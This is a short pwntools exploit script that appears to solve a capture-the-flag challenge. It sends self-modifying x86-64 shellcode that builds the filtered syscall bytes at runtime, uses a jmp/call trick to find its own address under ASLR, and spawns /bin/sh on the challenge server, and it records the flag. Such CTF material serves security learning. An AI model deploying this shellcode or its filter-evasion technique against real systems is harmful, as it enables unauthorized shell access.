from pwn import *

r = remote("actf.jinblack.it", 4002)

'''
r = process("./syscaslr")
gdb.attach(r, """
   
 	c
 	""")
''' 
input("wait")

# Now we have aslr and we cannot have neither \x0f nor \x05 in the code, so
# - jmp and call to get the current address
# - mov and add to form 0F and 05
'''
jmp endshellcode
shellcode:
pop rdi
mov rax, 0x3b
mov BYTE PTR[rdi-7], 0x0E
add BYTE PTR[rdi-7], 0x01
mov BYTE PTR[rdi-6], 0x04
add BYTE PTR[rdi-6], 0x01
xor rsi, rsi
xor rdx, rdx
nop     # rdi-7 lands here
nop     # rdi-6 lands here

endshellcode:
call shellcode
'''
shellcode = b"\xEB\x20\x5F\x48\xC7\xC0\x3B\x00\x00\x00\xC6\x47\xF9\x0E\x80\x47\xF9\x01\xC6\x47\xFA\x04\x80\x47\xFA\x01\x48\x31\xF6\x48\x31\xD2\x90\x90\xE8\xDB\xFF\xFF\xFF"
shellcode = shellcode + b"/bin/sh\x00" + b"\x00"*8

payload = b"\x90" * 8 + shellcode + b"\x90" * (100)

r.send(payload)

r.interactive()
#flag{nice_job!_self_modifying_shellcode?getting_address_wiht_call?}
